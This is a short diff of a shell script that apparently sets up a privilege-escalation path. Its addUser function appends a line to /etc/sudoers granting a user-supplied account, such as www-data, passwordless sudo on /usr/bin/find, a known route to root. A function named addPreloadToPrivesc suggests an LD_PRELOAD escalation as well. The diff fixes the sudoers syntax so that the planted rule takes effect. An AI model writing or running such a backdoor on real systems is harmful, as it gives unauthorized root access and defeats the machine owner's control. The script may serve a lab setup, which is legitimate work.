@@ -10,7 +10,7 @@ addPreloadToPrivesc(){
 
 addUser(){
 	read -p "Enter with your user or www-data: " user
-	echo "$user (ALL : ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
+	echo "$user ALL=(ALL:ALL) NOPASSWD: /usr/bin/find" >> /etc/sudoers
 }
 
 addPreloadToPrivesc && addUser /
